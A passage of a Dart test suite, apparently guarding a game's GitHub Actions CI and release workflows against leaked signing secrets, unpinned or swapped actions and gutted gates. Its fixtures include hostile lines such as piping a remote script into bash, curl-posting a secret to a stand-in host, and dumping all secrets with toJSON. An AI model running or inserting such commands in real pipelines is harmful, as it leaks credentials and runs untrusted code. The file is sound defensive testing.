        ..writeAsStringSync(content);
      harnessWrote['${dir.path}/$relative'] = content;
    });

    // The caller's chance to assert the workspace is what it expects BEFORE
    // the body runs — a precondition check, not a hook for setup (#224).
    beforeRun?.call(dir);

    final script = File('${dir.path}/step.sh')..writeAsStringSync(expanded);
    harnessWrote[script.path] = expanded;
    final r = Process.runSync(
      '/bin/bash',
      [script.path],
      workingDirectory: dir.path,
      includeParentEnvironment: false,
      environment: {
        'PATH': '${bin.path}:/usr/bin:/bin',
        'RUNNER_TEMP': runnerTemp.path,
        'GITHUB_OUTPUT': '${dir.path}/out',
        'GITHUB_ENV': '${dir.path}/env',
        'GITHUB_PATH': '${dir.path}/path',
        'GITHUB_WORKSPACE': dir.path,
        'GITHUB_STEP_SUMMARY': '${dir.path}/summary',
        'GITHUB_REF_NAME': 'v1.2.3',
        'GITHUB_RUN_NUMBER': '7',
        'GITHUB_RUN_ATTEMPT': '1',
        'HS_KEYSTORE_B64': 'eA==',
        'HS_KEYSTORE_PASS': 'PROPAGATE-PASS-1',
        'HS_KEY_ALIAS': 'upload',
        'HS_KEY_PASS': 'PROPAGATE-PASS-1',
        // The play workflows' steps read these. A body that aborts on an
        // unbound variable under `set -u` cannot pass, and a step that
        // cannot pass makes its propagation check unfalsifiable.
        'PLAY_SERVICE_ACCOUNT_JSON': '{"type":"service_account"}',
        'PLAY_TOKEN': 'PROPAGATE-TOKEN-1',
        'PACKAGE': 'com.honestarcade.sudoku',
        'FROM_TRACK': 'internal',
        'TO_TRACK': 'alpha',
        'PROMOTE_OUTCOME': 'success',
        ...extraEnv,
      },
      stdoutEncoding: utf8,
      stderrEncoding: utf8,
    );
    // What the body left in the workspace: the name and the current bytes of
    // everything under `$GITHUB_WORKSPACE` that the harness did not put
    // there. Not literally everything it wrote — a file it created and then
    // deleted is gone by the time this runs, as it would be for the sinks
    // this models — and the harness's own files are skipped while their
    // bytes are unchanged. A step's exit code says nothing about what it
    // published, and #215 is a step that exits 0 and puts the signing
    // keystore in the run summary.
    final wrote = StringBuffer();
    for (final entity in dir.listSync(recursive: true)) {
      // THE NAME, not only the content. `upload-artifact` publishes the paths
      // of what it sweeps as surely as the bytes, so `touch
      // "$GITHUB_WORKSPACE/$HS_KEYSTORE_B64"` put the keystore in an artifact
      // listing while this channel — which read bytes and used the path only
      // as a map key — stayed silent (#249). Directories count: a directory
      // name is listed too.
      final relative = entity.path.substring(dir.path.length + 1);
      if (entity is Directory) {
        wrote.writeln(relative);
        continue;
      }
      if (entity is! File) continue;
      // latin1 over the BYTES, and no `catch`. `readAsStringSync` throws on
      // the first byte that is not valid UTF-8, and the catch that stood
      // here dropped the whole file — so `printf '%s\377' "$HS_KEYSTORE_B64"`
      // put the keystore in the run summary with the suite green (#236).
      // A total decoding leaves every ASCII byte of a secret searchable.
      final text = latin1.decode(entity.readAsBytesSync(), allowInvalid: true);
      // Unchanged since the harness wrote it — a stub, the script, a planted
      // input — so the body did not write it. Anything else in this tree it
      // DID write, including a file it put inside `bin/`, the script
      // overwritten under its own feet, and a planted file it appended to:
      // all three were skipped by path and all three were green (#243).
      if (harnessWrote[entity.path] == text) continue;
      wrote.writeln(relative);
      wrote.writeln(text);
    }

    return (
      code: r.exitCode,
      out: r.stdout.toString(),
      err: r.stderr.toString(),
      wrote: wrote.toString(),
      workspace: dir,
    );
  } finally {
    if (!keepWorkspace) dir.deleteSync(recursive: true);
  }
}

/// What an inserted step in this job would have access to.
///
/// The shared reason string used to name `promote`'s Play token whatever job
/// it was reporting on, which reads as a copy-paste in a failure message that
/// is supposed to tell you what is at stake (#209).
String _jobHolds(String path, String job) {
  if (job == 'promote') return 'a live Play token';
  if (job == 'check') return 'the service-account key and the keystore';
  if (job == 'ship') return 'the signing keystore and every release secret';
  if (job == 'report-gate-failure') {
    return 'every workflow-level secret, on every failed gate';
  }
  return 'that job\'s secrets';
}

/// A step that hands the service-account key to a Play upload action.
/// Matched on the action's repository path rather than a substring of the
/// whole `uses:`, so a lookalike under another owner is not this (#169).
bool _isPlayUpload(WorkflowStep step) {
  final uses = step.uses;
  if (uses == null) return false;
  final path = uses.split('@').first;
  return path.endsWith('/upload-google-play') ||
      step.with_.containsKey('serviceAccountJsonPlainText');
}

void _assertReleaseShape(Workflow wf) {
  expect(wf.problem, isNull);

  // Only a version tag may start it. `branches: [main]` would ship on
  // every merge.
  expect(wf.triggers, ['push'], reason: 'release-shape: triggers');
  expect(wf.pushTags, [
    'v*',
  ], reason: 'release-shape: only a version tag ships');
  expect(
    wf.pushBranches,
    isEmpty,
    reason: 'release-shape: a branch filter would ship on every merge',
  );

  expect(
    wf.jobs.map((j) => j.name).toList(),
    ['gate', 'ship', 'report-gate-failure'],
    reason:
        'release-shape: exactly these three jobs — an added job runs with '
        'the same secrets and nothing above constrains it',
  );

  final gate = wf.job('gate');
  expect(gate, isNotNull, reason: 'release-shape: no gate job');
  expect(
    gate!.uses,
    './.github/workflows/ci.yml',
    reason:
        'release-shape: the gate must CALL the pull-request workflow, '
        'not restate or replace its steps',
  );
  expect(gate.secretsInherit, isTrue);
  expect(gate.steps, isEmpty, reason: 'release-shape: a `uses:` job');

  final ship = wf.job('ship');
  expect(ship, isNotNull);
  expect(ship!.needs, contains('gate'));
  expect(
    ship.ifExpression,
    isNull,
    reason: 'release-shape: an `if:` on ship would let it run on a red gate',
  );
  expect(wf.job('report-gate-failure')!.needs, contains('gate'));

  final ids = ship.steps.map((s) => s.id).toList();
  expect(ids.first, 'checkout');
  expect(
    ids[1],
    'secrets_present',
    reason: 'release-shape: the secrets assertion runs before any build',
  );

  // No job may be non-blocking. GitHub treats a `continue-on-error` job as
  // succeeded for everything that `needs:` it, so `continue-on-error: true`
  // on `gate` lets `ship` upload on a red gate — and every assertion about
  // `ship` above still passes (#169).
  for (final job in wf.jobs) {
    expect(
      job.continueOnError,
      isFalse,
      reason:
          'release-shape: job `${job.name}` (line ${job.line}) carries '
          '`continue-on-error`, which makes its failure non-blocking for '
          'everything that needs it',
    );
  }

  // Exactly one step in the WHOLE FILE may talk to Play, and everything that
  // proves the bundle must run before it — unconditionally. Scoping this to
  // `ship` let a second job upload to production untouched (#169).
  final playSteps = <({WorkflowJob job, WorkflowStep step})>[
    for (final job in wf.jobs)
      for (final step in job.steps)
        if (_isPlayUpload(step)) (job: job, step: step),
  ];
  expect(
    playSteps.map((p) => '${p.job.name}.${p.step.id ?? p.step.index}').toList(),
    ['ship.play'],
    reason:
        'release-shape: exactly one Play upload, in `ship` — a second one '
        'anywhere in the file can name any track it likes',
  );
  final play = playSteps.single.step;

  // The exact pin, not `contains`. `attacker/upload-google-play@v1` contains
  // the same substring and would be handed the service-account key (#169).
  expect(
    play.uses,
    'r0adkll/upload-google-play@v1',
    reason: 'release-shape: the upload action must be the pinned one',
  );
  expect(
    play.with_['track'],
    'internal',
    reason: 'release-shape: automation never touches production',
  );
  expect(play.with_['status'], 'completed');
  // Never asserted before: the upload could name another app entirely, or a
  // file the gate never scanned (#169).
  expect(
    play.with_['packageName'],
    'com.honestarcade.sudoku',
    reason: 'release-shape: the upload must name THIS package',
  );
  expect(
    play.with_['releaseFiles'],
    'build/app/outputs/bundle/release/app-release.aab',
    reason:
        'release-shape: the upload must ship the bundle the scan and the '
        'certificate check actually ran against',
  );
  expect(
    play.isUnconditional,
    isTrue,
    reason:
        'release-shape: `if:` or `continue-on-error` on the upload '
        'would ship after an earlier failure',
  );

  final playIndex = ship.steps.indexOf(play);
  for (final earlier in const [
    'secrets_present',
    'version',
    'keystore_check',
    'build',
    'scan',
    'cert',
  ]) {
    final index = ship.indexOfId(earlier);
    expect(
      index,
      inInclusiveRange(0, playIndex - 1),
      reason: 'release-shape: `$earlier` must run before the upload',
    );
    expect(
      ship.steps[index].isUnconditional,
      isTrue,
      reason:
          'release-shape: `$earlier` must be unconditional, or the '
          'upload can be reached without it',
    );
  }
  expect(ship.indexOfId('summary'), greaterThan(playIndex));

  // The step SET. Only `summary`'s index was bounded, so a step inserted
  // between `play` and `summary` that curls the bundle out was green — a
  // defect written out verbatim in #169's own body and closed without being
  // fixed (#182).
  expect(
    ship.steps.map((s) => s.id).toList(),
    [
      'checkout',
      'secrets_present',
      'version',
      'java',
      'flutter',
      'deps',
      'keystore',
      'keystore_check',
      'build',
      'scan',
      'cert',
      'sidecar',
      'artifact',
      'asset',
      'play',
      'summary',
      'name_failure',
      'shred',
    ],
    reason:
        'release-shape: exactly these steps in this order. Anything else in '
        '`ship` runs with all five secrets and the built bundle on disk',
  );

  // Modelled by #169's Fix line and read by nothing until now (#182).
  _assertRunnerAndEnvironment(wf);
  for (final job in wf.jobs) {
    if (job.uses != null) continue;
    expect(
      job.runsOn,
      'ubuntu-latest',
      reason:
          'release-shape: job `${job.name}` runs on `${job.runsOn}`. A '
          'self-hosted runner would see every secret this workflow holds',
    );
    expect(
      job.environment,
      isNull,
      reason:
          'release-shape: job `${job.name}` declares environment '
          '`${job.environment}`, which carries its own secrets and reviewers',
    );
  }

  // The steps that enforce invariant 1 and the signing identity must
  // actually run their scripts.
  _expectRunsExactly(
    ship.stepById('scan'),
    'tools/check_aab.sh',
    'release-shape: `scan` must run the permission scan',
  );
  expect(
    ship.stepById('sidecar')!.run,
    contains(r'sha256sum "$aab" > "$aab.sha256"'),
    reason:
        'release-shape: the sidecar must compute the checksum. Emptying it '
        r'(`: > "$aab.sha256"`) was green, and #198 listed pinning it (#209)',
  );
  _expectRunsExactly(
    ship.stepById('cert'),
    'tools/verify_upload_cert.sh',
    'release-shape: `cert` must run the certificate check',
  );
  // `contains`, and `|| true` keeps the substring — so #167's literal title
  // ("every `run:` assertion is a substring") was still true of this one
  // line after #167 closed. The executing tests stub keytool with exit 0, so
  // they never exercise it failing either (#189).
  final keystoreCheck = ship.stepById('keystore_check')!.run!;
  expect(
    keystoreCheck,
    contains(r'-alias "$HS_KEY_ALIAS"'),
    reason: 'release-shape: without -alias the check passes a wrong alias',
  );
  // EVERY step with a body, not four named ones. `version`'s `|| true` made
  // a malformed tag stop failing the build, and it was outside the scanned
  // set (#197).
  for (final step in ship.steps) {
    final body = step.run;
    if (body == null) continue;
    final swallowed = _swallowsFailure(body);
    expect(
      swallowed,
      isEmpty,
      reason:
          'release-shape: `${step.id ?? step.index}` discards the exit '
          'status of $swallowed — the step then reports success whatever '
          'happened inside it',
    );
  }

  // The INVERSE of the old shape. Seven steps were required to be
  // unconditional and the other nineteen could carry anything; now every
  // step must be unconditional except a named few, so a new step is safe by
  // default rather than unguarded by default (#197).
  const mayBeConditional = {'summary', 'name_failure', 'shred'};
  for (final step in ship.steps) {
    if (mayBeConditional.contains(step.id)) continue;
    expect(
      step.isUnconditional,
      isTrue,
      reason:
          'release-shape: step `${step.id ?? step.index}` is conditional '
          '(if: ${step.ifExpression}, continue-on-error: '
          '${step.continueOnError}). Only ${mayBeConditional.join(', ')} may '
          'be, and they must be reached on the failure path on purpose',
    );
  }
  expect(
    ship.stepById('shred'),
    isNotNull,
    reason: 'release-shape: the keystore must be deleted',
  );
  expect(ship.stepById('shred')!.ifExpression, 'always()');

  final artifact = ship.steps.firstWhere(
    (s) => (s.uses ?? '').contains('upload-artifact'),
  );
  expect(artifact.with_['retention-days'], '30');
  // Named by AC3 and asserted by nothing — renaming it to `bundle` was green
  // (#198). The tag in the name is how a run's artifact is identified later.
  expect(
    artifact.with_['name'],
    'honest-sudoku-signed-\${{ github.ref_name }}',
    reason: 'release-shape: the artifact name must carry the tag',
  );
}

void main() {
  group('the repository as it stands', () {
    test('there is at least one workflow', () {
      // An empty or missing directory fails rather than passing vacuously.
      // Every other test in this group iterates the list, so without this one
      // the whole file would go green the moment CI was deleted.
      expect(
        _workflowFiles(),
        isNotEmpty,
        reason:
            'no-workflows: $_workflowDir holds no .yml or .yaml file, so '
            'nothing gates a pull request',
      );
    });

    test('every action is pinned to a fixed, non-floating ref', () {
      final offenders = <String>[];
      for (final path in _workflowFiles()) {
        offenders.addAll(
          unpinnedUses(path, readFile(path)).map((o) => o.toString()),
        );
      }
      expect(offenders, isEmpty, reason: describeOffenders('pins', offenders));
    });

    test('every workflow declares its permissions and never write-all', () {
      final offenders = <String>[];
      for (final path in _workflowFiles()) {
        offenders.addAll(
          permissionOffenders(path, readFile(path)).map((o) => o.toString()),
        );
      }
      expect(
        offenders,
        isEmpty,
        reason: describeOffenders('permissions', offenders),
      );
    });

    test('every workflow declares a concurrency group', () {
      final offenders = <String>[];
      for (final path in _workflowFiles()) {
        offenders.addAll(
          concurrencyOffenders(path, readFile(path)).map((o) => o.toString()),
        );
      }
      expect(
        offenders,
        isEmpty,
        reason: describeOffenders('concurrency', offenders),
      );
    });

    test(
      'no workflow lets a secret or an untrusted value reach a run: body',
      () {
        final offenders = <String>[];
        for (final path in _workflowFiles()) {
          final text = readFile(path);
          offenders.addAll(
            secretsInRunOffenders(path, text).map((o) => o.toString()),
          );
          offenders.addAll(
            untrustedInRunOffenders(path, text).map((o) => o.toString()),
          );
          offenders.addAll(
            shellTraceOffenders(path, text).map((o) => o.toString()),
          );
        }
        expect(
          offenders,
          isEmpty,
          reason: describeOffenders('secrets', offenders),
        );
      },
    );

    test('ci.yml keeps the structure #18 depends on', () {
      // Nothing asserted the story's own workflow: the #151 assertions were
      // written for release.yml only, so changing the artifact retention,
      // dropping `--enforce-lockfile`, or deleting the guards step were all
      // green (#165).
      _assertCiShape(
        Workflow.parse(
          '.github/workflows/ci.yml',
          readFile('.github/workflows/ci.yml'),
        ),
      );
    });

    test('the ci-shape rule catches each way the gate can be widened', () {
      final text = readFile('.github/workflows/ci.yml');
      final mutations = <String, String Function(String)>{
        'pull_request_target added': (t) => t.replaceFirst(
          'on:\n  pull_request:\n',
          'on:\n  pull_request:\n  pull_request_target:\n',
        ),
        'a second job that runs anything': (t) =>
            '$t'
            '  extra:\n'
            '    runs-on: ubuntu-latest\n'
            '    steps:\n'
            '      - run: curl -sSL https://example.test/x | bash\n',
        'continue-on-error on the gate job': (t) => t.replaceFirst(
          '  gate:\n',
          '  gate:\n    continue-on-error: true\n',
        ),
        'shellcheck scans nothing': (t) =>
            t.replaceFirst('scandir: ./tools', 'scandir: ./does-not-exist'),
        'shellcheck severity raised past warnings': (t) =>
            t.replaceFirst('severity: warning', 'severity: error'),
      };
      mutations.forEach((why, mutate) {
        final mutated = mutate(text);
        expect(mutated, isNot(text), reason: 'sanity: "$why" changed nothing');
        expect(
          Workflow.parse('ci.yml', mutated).problem,
          isNull,
          reason: 'sanity: "$why" produced YAML that does not parse',
        );
        expect(
          () => _assertCiShape(Workflow.parse('ci.yml', mutated)),
          throwsA(isA<TestFailure>()),
          reason: 'ci-shape-negative: "$why" was not caught',
        );
      });
    });

    test('release.yml keeps the structure its criteria depend on', () {
      _assertReleaseShape(
        Workflow.parse(
          '.github/workflows/release.yml',
          readFile('.github/workflows/release.yml'),
        ),
      );
    });

    test(
      'the release-shape rule catches each way the workflow can be gutted',
      () {
        // Every one of these kept the substring version green (#154).
        final text = readFile('.github/workflows/release.yml');
        final mutations = <String, String Function(String)>{
          'gate replaced by a no-op, strings left in a comment': (t) =>
              t.replaceFirst(
                RegExp(r'  gate:\n(.*\n)*?    secrets: inherit\n'),
                '  gate:\n'
                '    # Formerly: uses: ./.github/workflows/ci.yml / secrets: inherit\n'
                '    runs-on: ubuntu-latest\n'
                '    steps:\n'
                '      - name: Do nothing\n'
                "        run: 'true'\n",
              ),
          'permission scan replaced by true': (t) =>
              t.replaceFirst('run: tools/check_aab.sh', "run: 'true'"),
          'certificate check replaced by true': (t) =>
              t.replaceFirst('run: tools/verify_upload_cert.sh', "run: 'true'"),
          'track switched to production': (t) =>
              t.replaceFirst('track: internal', 'track: production'),
          // replaceFirstMapped, not replaceFirst: the plain form inserts the
          // replacement LITERALLY, so `$1` went in as two characters at
          // column 0, broke the block scalar, and the workflow stopped
          // parsing. The battery then saw `expect(wf.problem, isNull)` throw
          // and called it a catch — having proved that malformed YAML fails
          // to parse, not that the rule detects an `if:` on the upload (#172).
          'if: always() on the Play upload': (t) => t.replaceFirstMapped(
            RegExp(r'(      - id: play\n        name: [^\n]*\n)'),
            (m) => '${m[1]}        if: always()\n',
          ),
          'trigger changed to every push to main': (t) => t.replaceFirst(
            RegExp(r"    tags:\n      - 'v\*'\n"),
            '    branches:\n      - main\n',
          ),
          'keystore_check loses -alias': (t) =>
              t.replaceFirst(' \\\n            -alias "\$HS_KEY_ALIAS"', ''),
          // #169: all four of these were green when the assertions were
          // scoped to the `ship` job and matched the action by substring.
          'a second job uploads to production': (t) =>
              '$t'
              '  publish_prod:\n'
              '    needs: ship\n'
              '    runs-on: ubuntu-latest\n'
              '    steps:\n'
              '      - id: play2\n'
              '        uses: r0adkll/upload-google-play@v1\n'
              '        with:\n'
              '          packageName: com.honestarcade.sudoku\n'
              '          releaseFiles: app.aab\n'
              '          track: production\n'
              '          status: completed\n',
          'continue-on-error on the gate job': (t) => t.replaceFirst(
            '  gate:\n',
            '  gate:\n    continue-on-error: true\n',
          ),
          'the upload action is swapped for a fork': (t) => t.replaceFirst(
            'uses: r0adkll/upload-google-play@v1',
            'uses: attacker/upload-google-play@v1',
          ),
          'the upload names another package': (t) => t.replaceFirst(
            'packageName: com.honestarcade.sudoku',
            'packageName: com.attacker.sudoku',
          ),
          'the upload ships an unscanned file': (t) => t.replaceFirst(
            'releaseFiles: build/app/outputs/bundle/release/app-release.aab',
            'releaseFiles: /tmp/other.aab',
          ),
          'shred step deleted': (t) => t.replaceFirst(
            RegExp(
              r'      - id: shred\n'
              r'        name: [^\n]*\n'
              r'        if: always\(\)\n'
              r'        run: [^\n]*\n',
            ),
            '',
          ),
        };
        mutations.forEach((why, mutate) {
          final mutated = mutate(text);
          expect(
            mutated,
            isNot(text),
            reason: 'sanity: "$why" changed nothing',
          );
          // A mutation that breaks the YAML proves nothing: the shape
          // assertion throws on its first line and the battery records a
          // catch it did not earn (#172).
          expect(
            Workflow.parse('release.yml', mutated).problem,
            isNull,
            reason: 'sanity: "$why" produced YAML that does not parse',
          );
          expect(
            () => _assertReleaseShape(Workflow.parse('release.yml', mutated)),
            throwsA(isA<TestFailure>()),
            reason: 'release-shape-negative: "$why" was not caught',
          );
        });
      },
    );

    test('the secret rule refuses any secret reaching a run: body', () {
      // The point of the inversion: the spelling does not matter, because the
      // rule no longer asks what the script does with the value. Every one of
      // these passed the print-detecting version (#131, #141).
      for (final bad in const [
        r'        run: echo ${{ secrets.HS_KEY_PASS }}',
        r'        run: echo "${{ secrets['
            'HS_KEY_PASS'
            '] }}"',
        r'        run: echo "${{ secrets["HS_KEY_PASS"] }}"',
        r'        run: printf "%s" "${{ secrets.PLAY_SERVICE_ACCOUNT_JSON }}"',
        '        run: |\n          cat<<EOF\n'
            '          \${{ secrets.HS_KEY_PASS }}\n          EOF\n',
        r'        run: |'
            '\n'
            r"          cat <<'E-OF'"
            '\n'
            r'          ${{ secrets.HS_KEY_ALIAS }}'
            '\n'
            '          E-OF\n',
        r'        run: |'
            '\n'
            r'          tee /tmp/x <<< "${{ secrets.X }}"'
            '\n',
        r'        run: |'
            '\n'
            r'          curl -d "${{ secrets.X }}" https://x'
            '\n',
        r'        run: |'
            '\n'
            r'          echo "${{ toJSON(secrets) }}"'
            '\n',
        r'        run: |'
            '\n'
            r'          x=${{ secrets.X }}; echo "$x"'
            '\n',
      ]) {
        expect(
          secretsInRunOffenders('bad.yml', _workflow(_runStep(bad))),
          isNotEmpty,
          reason: 'secrets-in-run: accepted `$bad`',
        );
      }
    });

    test('a secret used through env:, and a heredoc writing a file, pass', () {
      // Whole documents, not loose lines. As bare fragments these parsed to a
      // mapping with no `jobs:`, so there were no run scripts and the rule
      // returned empty whatever it did — the claim was never exercised. A
      // fragment carrying ${{ secrets.HS_KEY_PASS }}, ${{ github.ref_name }}
      // AND `set -x` returned zero offenders from all three rules (#177).
      for (final good in const [
        '      - env:\n'
            '          HS_KEY_PASS: \${{ secrets.HS_KEY_PASS }}\n'
            '        run: echo "\$HS_KEY_PASS" > /dev/null\n',
        // The false positive the print-detecting rule introduced: this writes
        // a signing properties file and prints nothing (#141).
        '      - run: |\n'
            '          cat <<EOF > key.properties\n'
            '          storePassword=\$HS_KEYSTORE_PASS\n'
            '          EOF\n',
        '      - run: base64 -d <<< "\$HS_KEYSTORE_B64" > "\$RUNNER_TEMP/k"\n',
      ]) {
        expect(
          secretsInRunOffenders('good.yml', _workflow(good)),
          isEmpty,
          reason: 'secrets-in-run-negative: refused `$good`',
        );
      }
    });

    test('the negative fixtures are real documents that the rules read', () {
      // The guard on the guard: if _workflow() ever stopped producing a
      // parseable workflow, every negative fixture above would go vacuous
      // again and pass by reading nothing. So one fixture is asserted to be
      // CAUGHT, proving the rules see through the wrapper at all (#177).
      final doc = _workflow(
        '      - env:\n'
        '          TAG: \${{ github.ref_name }}\n'
        '        run: echo "\${{ secrets.HS_KEY_PASS }}"\n'
        '          set -x\n',
      );
      expect(Workflow.parse('x.yml', doc).problem, isNull);
      expect(
        secretsInRunOffenders('x.yml', doc),
        isNotEmpty,
        reason: 'the wrapper must produce a document the rules actually read',
      );
    });

    test('untrusted github/inputs values are refused in a run: body', () {
      for (final bad in const [
        r'        run: echo "### Release ${{ github.ref_name }}"',
        r'        run: echo "${{ inputs.to_track }}"',
        '        run: |\n          echo "from \${{ inputs.from_track }}"\n',
        r'        run: echo "${{ github.event.pull_request.title }}"',
      ]) {
        expect(
          untrustedInRunOffenders('bad.yml', _workflow(_runStep(bad))),
          isNotEmpty,
          reason: 'untrusted-in-run: accepted `$bad`',
        );
      }
    });

    test('step outputs and non-run uses of github. are allowed', () {
      // Whole documents, for the reason in the fixture above (#177).
      for (final good in const [
        '      - run: echo "\${{ steps.version.outputs.name }}"\n',
        "      - if: github.event_name == 'pull_request'\n"
            '        run: echo hello\n',
        '      - uses: actions/upload-artifact@v7\n'
            '        with:\n'
            '          name: honest-sudoku-aab-\${{ github.sha }}\n',
        '      - env:\n'
            '          TAG: \${{ github.ref_name }}\n'
            '        run: echo "\$TAG"\n',
      ]) {
        expect(
          untrustedInRunOffenders('good.yml', _workflow(good)),
          isEmpty,
          reason: 'untrusted-in-run-negative: refused `$good`',
        );
      }
    });

    test('every tracing spelling is refused', () {
      for (final bad in const [
        'set -x',
        'set -euxo pipefail',
        'foo; set -ex',
        'set -v',
        'set -o xtrace',
        'set -o verbose',
        // Each of these passed the firstMatch version (#141).
        'set -euo pipefail; set -x',
        'set -e -x',
        'set -o errexit -o xtrace',
        r'set -o "xtrace"',
        'bash -x tools/gate.sh',
        'sh -x script.sh',
      ]) {
        expect(
          shellTraceOffenders('bad.yml', _workflow(_runStep(bad))),
          isNotEmpty,
          reason: 'trace: accepted `$bad`',
        );
      }
      for (final good in const [
        'set -euo pipefail',
        'set -e',
        'settle -x',
        'set -o pipefail',
        'set -o errexit',
        'bash tools/gate.sh',
        'grep -v foo bar',
      ]) {
        expect(
          shellTraceOffenders('good.yml', _workflow(_runStep(good))),
          isEmpty,
          reason: 'trace-negative: refused `$good`',
        );
      }
    });

    test('a tracing shell is refused at workflow, job and step level', () {
      // Only the step level was checked, so a two-character change to the
      // workflow-level `shell: bash` that every file here already has traced
      // every step in the job holding all five secrets (#168).
      const header =
          'name: F\non: workflow_dispatch\n'
          'permissions:\n  contents: read\nconcurrency: f\n';
      const job = 'jobs:\n  a:\n    steps:\n      - run: echo hi\n';

      for (final entry in const {
        'workflow level':
            '${header}defaults:\n  run:\n    shell: bash -x\n$job',
        'job level':
            '${header}jobs:\n  a:\n    defaults:\n      run:\n'
            '        shell: bash -x\n    steps:\n      - run: echo hi\n',
        'step level':
            '$header${'jobs:\n  a:\n    steps:\n'
                '      - shell: bash -x\n        run: echo hi\n'}',
      }.entries) {
        expect(
          shellTraceOffenders('bad.yml', entry.value),
          isNotEmpty,
          reason: 'trace: a tracing shell at ${entry.key} was accepted',
        );
      }

      for (final entry in const {
        'workflow level': '${header}defaults:\n  run:\n    shell: bash\n$job',
        'job level':
            '${header}jobs:\n  a:\n    defaults:\n      run:\n'
            '        shell: bash\n    steps:\n      - run: echo hi\n',
      }.entries) {
        expect(
          shellTraceOffenders('good.yml', entry.value),
          isEmpty,
          reason: 'trace-negative: a plain shell at ${entry.key} was refused',
        );
      }
    });

    test('a shell: value or SHELLOPTS that traces is refused', () {
      // Read structurally now, so a quoted or flow-style value is seen too.
      for (final bad in const [
        '      - shell: bash -x\n        run: echo hi\n',
        '      - shell: "bash -ex"\n        run: echo hi\n',
        '      - shell: bash -v\n        run: echo hi\n',
        "      - {shell: 'bash -x', run: echo hi}\n",
        '      - run: |\n          export SHELLOPTS=xtrace\n',
      ]) {
        expect(
          shellTraceOffenders('bad.yml', _workflow(bad)),
          isNotEmpty,
          reason: 'trace: accepted `$bad`',
        );
      }
      for (final good in const [
        '      - shell: bash\n        run: echo hi\n',
        '      - shell: pwsh\n        run: echo hi\n',
        '      - shell: bash -e\n        run: echo hi\n',
      ]) {
        expect(
          shellTraceOffenders('good.yml', _workflow(good)),
          isEmpty,
          reason: 'trace-negative: refused `$good`',
        );
      }
    });

    test('a secret is seen through every YAML step shape', () {
      // All five parse to a step whose `run` holds the secret, and all five
      // were invisible to the line scan this replaced (#156).
      const shapes = <String, String>{
        'flow mapping': '      - {run: "echo \${{ secrets.A }}"}\n',
        'quoted key': '      - "run": echo \${{ secrets.B }}\n',
        'anchor before the block indicator':
            '      - run: &s |\n          echo \${{ secrets.C }}\n',
        'alias smuggling':
            '      - name: &a "echo \${{ secrets.D }}"\n'
            '        run: *a\n',
        'multi-line quoted scalar':
            '      - run: "echo\n          \${{ secrets.E }}"\n',
      };
      shapes.forEach((why, step) {
        expect(
          secretsInRunOffenders('bad.yml', _workflow(step)),
          isNotEmpty,
          reason: 'shape: $why was invisible',
        );
      });
    });

    test('a secret is seen through every expression spelling', () {
      // Actions contexts and functions are case-insensitive, and `join` over
      // the `*` filter dumps every secret the job can see (#157).
      for (final expression in const [
        r'${{ secrets.HS_KEY_PASS }}',
        r'${{secrets.HS_KEY_PASS}}',
        r'${{ SECRETS.HS_KEY_PASS }}',
        r'${{ Secrets.HS_KEY_PASS }}',
        r"${{ secrets['HS_KEY_PASS'] }}",
        r'${{ secrets["HS_KEY_PASS"] }}',
        r'${{ toJSON(secrets) }}',
        r'${{ toJson(secrets) }}',
        r'${{ toJSON (secrets) }}',
        r"${{ join(secrets.*, ',') }}",
        r"${{ format('{0}', secrets.HS_KEY_PASS) }}",
        r'${{ fromJSON(toJSON(secrets)).HS_KEY_PASS }}',
      ]) {
        expect(
          secretsInRunOffenders(
            'bad.yml',
            _workflow(_runStep('echo "$expression"')),
          ),
          isNotEmpty,
          reason: 'spelling: accepted `$expression`',
        );
      }
    });

    test('an untrusted value is seen through every expression spelling', () {
      for (final expression in const [
        r'${{ github.ref_name }}',
        r'${{ GITHUB.ref_name }}',
        r"${{ github['ref_name'] }}",
        r'${{ github["ref_name"] }}',
        r"${{ inputs['to_track'] }}",
        r"${{ env['TAG'] }}",
        r'${{ toJSON(github) }}',
        r'${{ fromJSON(github.event.inputs.x) }}',
        r"${{ format('{0}', github.ref_name) }}",
        r'${{ (github.ref_name) }}',
        r'${{ needs.a.outputs.y }}',
        r'${{ matrix.tag }}',
      ]) {
        expect(
          untrustedInRunOffenders(
            'bad.yml',
            _workflow(_runStep('echo "$expression"')),
          ),
          isNotEmpty,
          reason: 'spelling: accepted `$expression`',
        );
      }
    });

    test('prose that merely mentions a secret is allowed', () {
      // The rule used to match the literal text `secrets.`, so a filename or a
      // warning in a message was refused (#157).
      for (final script in const [
        'ls docs/secrets.md',
        'echo "never log secrets.MY"',
        'echo hi # never echo secrets.FOO',
        r'echo "$HS_KEY_PASS"',
        r'cat <<EOF > key.properties'
            '\n'
            r'storePassword=$HS_KEYSTORE_PASS'
            '\nEOF',
      ]) {
        expect(
          secretsInRunOffenders('good.yml', _workflow(_runStep(script))),
          isEmpty,
          reason: 'prose: refused `$script`',
        );
      }
    });

    test(
      'a step that puts run: on the dash line does not swallow its siblings',
      () {
        // `keyIndent` came from the column of the `-`, so `env:` after a
        // dash-line `run:` was read as part of the script and flagged — the
        // exact remediation the rule prescribes (#156).
        const step =
            '      - run: |\n'
            '          echo "\$K"\n'
            '        env:\n'
            '          K: \${{ secrets.HS_KEY_PASS }}\n';
        expect(
          secretsInRunOffenders('good.yml', _workflow(step)),
          isEmpty,
          reason: 'dash-line: refused a secret passed through step env:',
        );
      },
    );

    test('a document that parses but is not a usable workflow is refused', () {
      // parse() set `problem` only when the YAML would not load. Each of
      // these loaded, produced zero jobs or steps, and yielded zero
      // offenders from every rule — so a structurally wrong workflow scanned
      // as clean. The header promises the opposite: a guard that cannot read
      // its subject must fail, not pass quietly (#177).
      const unusable = <String, String>{
        'jobs: as a list': 'name: X\non: push\njobs:\n  - gate\n',
        'jobs: with no jobs': 'name: X\non: push\njobs: {}\n',
        'steps: as a map':
            'name: X\non: push\njobs:\n  a:\n    steps:\n      run: echo hi\n',
        'a step with neither run nor uses':
            'name: X\non: push\njobs:\n  a:\n    steps:\n      - name: x\n',
        'run: as a number':
            'name: X\non: push\njobs:\n  a:\n    steps:\n      - run: 42\n',
        'run: as a list':
            'name: X\non: push\njobs:\n  a:\n    steps:\n'
            '      - run:\n          - echo hi\n',
        'valid YAML that is not a workflow': 'hello: world\n',
      };
      unusable.forEach((why, text) {
        final wf = Workflow.parse('x.yml', text);
        expect(
          wf.problem,
          isNotNull,
          reason: 'unusable: "$why" was accepted as a readable workflow',
        );
        // And every rule must report it, rather than returning empty.
        for (final rule in <List<WorkflowOffender> Function(String, String)>[
          unpinnedUses,
          permissionOffenders,
          concurrencyOffenders,
